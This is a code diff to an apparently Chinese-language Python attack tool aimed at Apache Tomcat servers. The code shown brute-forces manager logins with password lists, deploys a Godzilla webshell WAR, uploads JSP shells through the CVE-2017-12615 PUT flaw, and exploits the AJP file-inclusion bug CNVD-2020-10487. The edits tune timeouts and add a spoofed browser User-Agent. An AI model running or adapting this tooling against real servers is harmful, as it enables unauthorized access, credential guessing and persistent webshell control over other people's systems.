@@ -14,6 +14,7 @@ import string
 import socket
 import struct
 from io import BytesIO as StringIO
+from urllib.parse import urlparse
 
 # 忽略HTTPS请求中的不安全请求警告
 requests.packages.urllib3.disable_warnings()
@@ -77,7 +78,7 @@ def generate_war(config):
 def get_jsessionid_and_csrf_nonce(url, username, password):
     try:
         login_url = f"{url}/manager/html"
-        response = requests.get(login_url, auth=HTTPBasicAuth(username, password), verify=False, timeout=10)
+        response = requests.get(login_url, auth=HTTPBasicAuth(username, password), verify=False, timeout=3)
         response.raise_for_status()
 
         cookies = response.cookies
@@ -126,11 +127,11 @@ def deploy_godzilla_war(url, username, password, war_file_path, random_string, s
             with open(war_file_path, 'rb') as war_file:
                 files = {file_field_name: (os.path.basename(war_file_path), war_file, 'application/octet-stream')}
                 response = requests.post(deploy_url, cookies=cookies, auth=HTTPBasicAuth(username, password),
-                                         files=files, verify=False, timeout=10)
+                                         files=files, verify=False, timeout=3)
             response.raise_for_status()
             shell_url = f"{url}/{random_string}/{shell_file_name}"
             shell_response = requests.get(shell_url, cookies=cookies, auth=HTTPBasicAuth(username, password),
-                                          verify=False, timeout=10)
+                                          verify=False, timeout=3)
             if shell_response.status_code == 200:
                 logger.info(f"{Fore.RED}[+] 成功获取 Webshell: {shell_url}{Style.RESET_ALL}")
                 with open(output_file, 'a', encoding='utf-8') as f:
@@ -161,13 +162,17 @@ def check_weak_password(url, usernames, passwords, output_file, max_retries, ret
         url_with_path = f"{base_url}/manager/html"
     else:
         url_with_path = url
+
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
+    }
+
     attempt = 0
     while attempt < max_retries:
         try:
             for username in usernames:
                 for password in passwords:
-                    response = requests.get(url_with_path, auth=HTTPBasicAuth(username, password), timeout=10,
-                                            verify=False)
+                    response = requests.get(url=url_with_path, auth=HTTPBasicAuth(username, password), headers=headers, timeout=10, verify=False)
                     if response.status_code == 200:
                         success_entry = f"{url_with_path} {username}:{password}"
                         logger.info(f"{Fore.RED}[+] 登录成功 {success_entry}{Style.RESET_ALL}")
@@ -518,8 +523,7 @@ class Tomcat:
         self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri,
                                                            method=AjpForwardRequest.REQUEST_METHODS.get(method))
         if user is not None and password is not None:
-            self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + (
-                        "%s:%s" % (user, password)).encode('base64').replace('\n', '')
+            self.forward_request.request_headers['SC_REQ_AUTHORIZATION'] = "Basic " + ("%s:%s" % (user, password)).encode('base64').replace('\n', '')
         for h in headers:
             self.forward_request.request_headers[h] = headers[h]
         for a in attributes:
@@ -557,10 +561,10 @@ def check_cve_2017_12615_and_cnvd_2020_10487(url, config):
         ]
 
         for idx, method_url in enumerate(exploit_methods):
-            response = requests.put(method_url, data=shell_file_content, headers=headers, verify=False, timeout=10)
+            response = requests.put(method_url, data=shell_file_content, headers=headers, verify=False, timeout=3)
             if response.status_code in [201, 204]:
                 check_url = f"{url}/{jsp_file_name}"
-                check_response = requests.get(check_url, verify=False, timeout=10)
+                check_response = requests.get(check_url, verify=False, timeout=3)
 
                 if check_response.status_code == 200:
                     logger.info(
@@ -575,7 +579,8 @@ def check_cve_2017_12615_and_cnvd_2020_10487(url, config):
 
         # 2. 检测CNVD-2020-10487漏洞 (AJP协议漏洞本地文件包含)
         try:
-            target_host = url.split("://")[-1].split("/")[0]
+            parsed_url = urlparse(url) # 解析 URL 并提取主机名
+            target_host = parsed_url.hostname  # 自动去掉端口号
             # 从配置文件中读取 CNVD-2020-10487 的 AJP 端口、文件路径和判断条件
             target_port = config['cnvd_2020_10487']['port']
             file_path = config['cnvd_2020_10487']['file_path']
